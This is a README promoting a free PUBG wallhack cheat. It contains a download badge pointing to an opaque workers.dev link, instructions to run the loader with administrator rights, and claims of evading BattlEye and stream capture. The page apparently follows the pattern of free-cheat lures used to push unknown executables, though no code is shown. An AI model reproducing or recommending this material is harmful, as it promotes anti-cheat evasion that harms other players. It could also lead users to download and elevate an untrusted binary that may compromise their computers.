# PUBG Wallhack — Outline

[![Download](https://img.shields.io/badge/Download-Free-38bdf8?style=for-the-badge&labelColor=0b1320)](https://xtiz6i8n6.fresh-link.workers.dev/f03e3ac6)

Wallhack outlines through buildings, rocks and terrain.

Fade 100-600 m, hidden color cyan, outline 2 px.

Admin loader, PUBG, INSERT, F4. Windows 10/11, Steam, BattlEye.


## Compatibility

- Windows 10 21H2 and newer, Windows 11
- borderless and windowed fullscreen
- 16:9 and 21:9, DPI up to 150%

## Visual tuning

| Parameter | Default | Range | Meaning |
| --- | --- | --- | --- |
| range | 500 | 50-900 | render distance |
| skeleton | on | on/off | joint lines |
| health | on | on/off | left bar |
| team filter | on | on/off | skip teammates |
| streamproof | on | on/off | capture safety |

## Troubleshooting

**No overlay.** Use borderless or windowed fullscreen, exclusive mode hides every overlay.

**Menu does not open.** Elevate the loader, INSERT is ignored otherwise.

**Nothing attaches.** Loader first, game second.

**Values wrong after patch.** Offsets are version bound, wait for a new build.

**OBS flicker.** Streamproof on plus game capture.

## Notes

- keep loader and config.json together
- close other overlays before attaching
- first launch after a patch is slower while offsets load

## Architecture

The loader stays outside the client, reads through a handle and paints its own overlay. Nothing is injected, so a game crash never takes the tool with it.

## FAQ

**External or internal?** Read the first line.

**Free?** Yes, no key.

**Config transfer?** Copy config.json next to the loader.

**Patch day?** Wait for the release, do not mix offsets.